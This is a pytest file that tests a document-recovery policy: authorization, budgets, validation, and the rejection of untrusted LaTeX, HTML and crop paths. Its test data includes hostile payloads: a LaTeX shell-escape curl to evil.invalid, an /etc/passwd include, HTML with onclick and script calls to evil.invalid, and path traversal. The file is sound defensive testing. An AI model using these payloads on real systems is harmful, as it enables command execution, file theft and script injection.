from __future__ import annotations

from pathlib import Path

import pytest

from backend.research.document.recovery_policy import (
    DocumentRecoveryPolicy,
    RecoveryCandidateStatus,
    RecoveryEvidenceSnapshot,
    RecoveryKind,
    RecoveryRequest,
    admit_crop_path,
    evaluate_roi_candidate,
    inspect_untrusted_latex,
    sanitize_untrusted_table_html,
)


def _snapshot(content: str, *, source_hash: str = "a" * 64) -> RecoveryEvidenceSnapshot:
    return RecoveryEvidenceSnapshot.from_content(
        backend="marker",
        content=content,
        source_hash=source_hash,
        source_refs=("paper://paper-1/pdf#page=1",),
        profile_id="research-parser-marker",
    )


def test_recovery_defaults_fail_closed_for_provider_and_roi() -> None:
    policy = DocumentRecoveryPolicy()

    decision = policy.authorize(
        RecoveryRequest(
            kind=RecoveryKind.PARSER,
            backend="marker",
            provider_id="docker",
            profile_id="research-parser-marker",
            attempt_number=1,
        )
    )

    assert decision.allowed is False
    assert decision.reason_code == "recovery_disabled"
    assert policy.formula_roi_enabled is False
    assert policy.table_cell_roi_enabled is False
    assert policy.authorized_provider_ids == ()
    assert policy.to_dict()["max_memory_bytes"] == 17_179_869_184
    assert policy.to_dict()["max_cpu_seconds"] == 120.0
    assert policy.to_dict()["max_processes"] == 1


def test_recovery_enforces_attempt_page_region_time_turn_and_replan_budgets() -> None:
    policy = DocumentRecoveryPolicy(
        enabled=True,
        parser_recovery_enabled=True,
        allowed_parser_backends=("marker",),
        authorized_provider_ids=("docker",),
        max_attempts=1,
        max_pages=1,
        max_regions=1,
        max_seconds=10,
        max_turns=1,
        max_replans=0,
    )

    exhausted = policy.authorize(
        RecoveryRequest(
            kind=RecoveryKind.PARSER,
            backend="marker",
            provider_id="docker",
            profile_id="research-parser-marker",
            attempt_number=2,
        )
    )
    unauthorized = policy.authorize(
        RecoveryRequest(
            kind=RecoveryKind.PARSER,
            backend="marker",
            provider_id="other-provider",
            profile_id="research-parser-marker",
            attempt_number=1,
            page_numbers=(1,),
            source_ref="paper://paper-1/pdf",
        )
    )

    assert exhausted.reason_code == "recovery_attempt_budget_exhausted"
    assert unauthorized.reason_code == "recovery_provider_unauthorized"


def test_table_roi_requires_reliable_geometry_and_authorized_provider() -> None:
    policy = DocumentRecoveryPolicy(
        enabled=True,
        table_cell_roi_enabled=True,
        authorized_provider_ids=("docker",),
    )

    decision = policy.authorize(
        RecoveryRequest(
            kind=RecoveryKind.TABLE_CELL_ROI,
            backend="marker",
            provider_id="docker",
            profile_id="research-parser-marker",
            attempt_number=1,
            page_numbers=(1,),
            region_refs=("table-1/cell-1",),
            geometry_reliable=False,
            source_ref="paper://paper-1/pdf",
            crop_ref="artifact://crop/table-1-cell-1.png",
        )
    )

    assert decision.allowed is False
    assert decision.reason_code == "table_cell_geometry_unreliable"


def test_renderable_or_longer_roi_candidate_remains_unverified() -> None:
    original = _snapshot("x")
    candidate = _snapshot("x + y + z")

    record = evaluate_roi_candidate(
        kind=RecoveryKind.FORMULA_ROI,
        original=original,
        candidate=candidate,
        source_crop_ref="artifact://crop/formula-1.png",
        geometry_reliable=True,
        renderable=True,
    )

    assert record.status is RecoveryCandidateStatus.UNVERIFIED
    assert record.reason_code == "roi_content_semantics_unverified"
    assert record.deterministic_checks["renderable"] is True
    assert record.deterministic_checks["longer_than_original"] is True


@pytest.mark.parametrize(
    "latex",
    [
        r"\\write18{curl https://evil.invalid/pwn}",
        r"\\input{/etc/passwd}",
        r"\\include{..\\..\\secret}",
        r"x + \\href{https://evil.invalid}{y}",
    ],
)
def test_latex_is_untrusted_data_and_rejects_shell_path_or_network_requests(latex: str) -> None:
    decision = inspect_untrusted_latex(latex)

    assert decision.allowed is False
    assert decision.reason_code in {
        "latex_unsafe_command",
        "latex_external_reference_forbidden",
    }


def test_html_sanitizer_preserves_cell_numbers_but_drops_active_content() -> None:
    raw = (
        '<table><tr><td onclick="fetch(\'https://evil.invalid\')">42.50</td>'
        '<td><script>window.location="https://evil.invalid"</script>-7</td></tr></table>'
    )

    sanitized = sanitize_untrusted_table_html(raw)

    assert "42.50" in sanitized
    assert "-7" in sanitized
    assert "script" not in sanitized.casefold()
    assert "onclick" not in sanitized.casefold()
    assert "evil.invalid" not in sanitized


def test_crop_path_is_confined_to_authorized_root(tmp_path: Path) -> None:
    root = tmp_path / "crops"
    root.mkdir()

    admitted = admit_crop_path(root, "paper-1/formula.png")
    assert admitted == (root / "paper-1" / "formula.png").resolve()

    with pytest.raises(ValueError, match="escapes"):
        admit_crop_path(root, "../secret.png")
    with pytest.raises(ValueError, match="local path"):
        admit_crop_path(root, "https://evil.invalid/crop.png")
    with pytest.raises(ValueError, match="suffix"):
        admit_crop_path(root, "paper-1/crop.tex")



def _admitted_request(**overrides) -> RecoveryRequest:
    values = {
        "kind": RecoveryKind.PARSER,
        "backend": "marker",
        "provider_id": "docker",
        "profile_id": "research-parser-marker",
        "attempt_number": 1,
        "page_numbers": (1,),
        "source_ref": "paper://paper-1/pdf",
        "region_refs": ("page-1/formula-1",),
        "crop_ref": "artifact://crop/page-1-formula-1.png",
        "geometry_reliable": True,
    }
    values.update(overrides)
    return RecoveryRequest(**values)


@pytest.mark.parametrize(
    "elapsed_seconds",
    [float("nan"), float("inf"), float("-inf"), -0.1, True, False, "1", None, 10**400],
)
def test_recovery_request_rejects_non_finite_or_non_numeric_elapsed_time(elapsed_seconds) -> None:
    with pytest.raises(ValueError, match="elapsed_seconds"):
        _admitted_request(elapsed_seconds=elapsed_seconds)


@pytest.mark.parametrize("page", [True, False, 1.9, 1.0, "1", None, 0, -1])
def test_recovery_request_does_not_coerce_page_numbers(page) -> None:
    with pytest.raises(ValueError, match="page_numbers"):
        _admitted_request(page_numbers=(page,))


def test_recovery_request_rejects_duplicate_pages() -> None:
    with pytest.raises(ValueError, match="page_numbers"):
        _admitted_request(page_numbers=(1, 1))


@pytest.mark.parametrize("flag", ["replay", "cancelled", "geometry_reliable"])
@pytest.mark.parametrize("value", [0, 1, "false", "true", None])
def test_recovery_request_requires_real_booleans(flag: str, value) -> None:
    with pytest.raises(TypeError, match=flag):
        _admitted_request(**{flag: value})


@pytest.mark.parametrize("kind", list(RecoveryKind))
@pytest.mark.parametrize(
    ("overrides", "reason"),
    [
        ({"page_numbers": ()}, "recovery_page_scope_unknown"),
        ({"source_ref": None}, "recovery_source_missing"),
    ],
)
def test_recovery_rejects_unknown_page_or_source_scope(kind, overrides, reason) -> None:
    policy = DocumentRecoveryPolicy(
        enabled=True,
        parser_recovery_enabled=True,
        formula_roi_enabled=True,
        table_cell_roi_enabled=True,
        authorized_provider_ids=("docker",),
    )

    decision = policy.authorize(_admitted_request(kind=kind, **overrides))

    assert decision.allowed is False
    assert decision.status.value == "blocked"
    assert decision.reason_code == reason


@pytest.mark.parametrize("kind", [RecoveryKind.FORMULA_ROI, RecoveryKind.TABLE_CELL_ROI])
@pytest.mark.parametrize("missing", ["crop_ref", "region_refs", "geometry_reliable"])
def test_roi_recovery_requires_explicit_crop_region_and_reliable_geometry(kind, missing) -> None:
    policy = DocumentRecoveryPolicy(
        enabled=True,
        formula_roi_enabled=True,
        table_cell_roi_enabled=True,
        authorized_provider_ids=("docker",),
    )
    changes = {missing: {"crop_ref": None, "region_refs": (), "geometry_reliable": False}[missing]}

    decision = policy.authorize(_admitted_request(kind=kind, **changes))

    assert decision.allowed is False
    assert decision.status.value == "blocked"
    assert decision.reason_code == {
        (RecoveryKind.FORMULA_ROI, "crop_ref"): "formula_roi_source_crop_missing",
        (RecoveryKind.FORMULA_ROI, "geometry_reliable"): "formula_roi_geometry_unreliable",
        (RecoveryKind.TABLE_CELL_ROI, "crop_ref"): "table_cell_geometry_unreliable",
        (RecoveryKind.TABLE_CELL_ROI, "geometry_reliable"): "table_cell_geometry_unreliable",
        (kind, "region_refs"): "recovery_region_scope_unknown",
    }[(kind, missing)]


@pytest.mark.parametrize("kind", list(RecoveryKind))
def test_explicit_authorized_scope_can_pass_recovery_gate(kind: RecoveryKind) -> None:
    policy = DocumentRecoveryPolicy(
        enabled=True,
        parser_recovery_enabled=True,
        formula_roi_enabled=True,
        table_cell_roi_enabled=True,
        authorized_provider_ids=("docker",),
    )

    decision = policy.authorize(_admitted_request(kind=kind))

    assert decision.allowed is True
    assert decision.reason_code == "recovery_authorized"


@pytest.mark.parametrize(
    ("changes", "reason"),
    [
        ({"page_numbers": (1, 2, 3, 4)}, "recovery_page_budget_exhausted"),
        ({"page_numbers": tuple(range(1, 101))}, "recovery_page_budget_exhausted"),
        ({"elapsed_seconds": 120.0}, "recovery_time_budget_exhausted"),
        ({"elapsed_seconds": 121.0}, "recovery_time_budget_exhausted"),
    ],
)
def test_recovery_enforces_real_page_and_elapsed_time_budgets(changes, reason: str) -> None:
    policy = DocumentRecoveryPolicy(
        enabled=True,
        parser_recovery_enabled=True,
        authorized_provider_ids=("docker",),
    )

    decision = policy.authorize(_admitted_request(**changes))

    assert decision.allowed is False
    assert decision.status.value == "exhausted"
    assert decision.reason_code == reason


@pytest.mark.parametrize("pages", [(2,), (1, 3), (2, 3)])
def test_whole_document_parser_requires_contiguous_scope_from_first_page(pages) -> None:
    policy = DocumentRecoveryPolicy(
        enabled=True,
        parser_recovery_enabled=True,
        authorized_provider_ids=("docker",),
    )

    decision = policy.authorize(_admitted_request(page_numbers=pages))

    assert decision.allowed is False
    assert decision.reason_code == "parser_whole_document_page_scope_incomplete"
